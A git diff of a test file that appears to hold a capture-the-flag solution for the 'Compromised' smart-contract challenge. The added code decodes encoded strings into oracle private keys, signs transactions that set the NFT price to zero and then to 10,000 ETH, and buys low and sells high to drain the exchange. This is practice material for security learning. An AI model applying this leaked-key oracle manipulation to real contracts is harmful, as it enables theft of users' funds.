@@ -44,13 +44,35 @@ describe('Compromised challenge', function () {
             { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
         );
         this.token = await DamnValuableNFT.at(await this.exchange.token());
-
-        // Keep track of attacker's initial ETH balance
-        this.initialAttackerbalance = await balance.current(attacker);
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const input1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
+        const input2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
+        const hex1 = input1.split(" ").join("")
+        const hex2 = input2.split(" ").join("")
+        const decoded1 = Buffer.from(web3.utils.hexToUtf8("0x" + hex1), 'base64').toString()
+        const decoded2 = Buffer.from(web3.utils.hexToUtf8("0x" + hex2), 'base64').toString()
+        const public1 = web3.eth.accounts.privateKeyToAccount(decoded1, true);
+        const public2 = web3.eth.accounts.privateKeyToAccount(decoded2, true);
+        console.log('public1 is: ' + public1.address + " and is on the list of sources: " + sources.includes(public1.address))
+        console.log('public2 is: ' + public2.address + " and is on the list of sources: " + sources.includes(public2.address))
+
+        const sendPrice = async (price, privateKey) => {
+            const data = await this.oracle.contract.methods.postPrice("DVNFT", price)
+            const tx = { to: this.oracle.address, data: data.encodeABI(), gas: 52232}
+            const signed = await web3.eth.accounts.signTransaction(tx, privateKey);
+            await web3.eth.sendSignedTransaction(signed.rawTransaction);         
+        }
+
+        await sendPrice(0, decoded1)
+        await sendPrice(0, decoded2)
+        await this.exchange.buyOne({value: 1, from: attacker})
+        await sendPrice("10000000000000000000000", decoded1) // for some reason EXCHANGE_INITIAL_ETH_BALANCE doesnt work
+        await sendPrice("10000000000000000000000", decoded2)
+        await this.token.approve(this.exchange.address, 1, {from:attacker});
+        await this.exchange.sellOne(1, {from: attacker})
     });
 
     after(async function () {
@@ -58,5 +80,8 @@ describe('Compromised challenge', function () {
         expect(
             await balance.current(this.exchange.address)
         ).to.be.bignumber.eq('0');
+        expect(
+            await balance.current(attacker)
+        ).to.be.bignumber.gt(EXCHANGE_INITIAL_ETH_BALANCE);
     });
 });
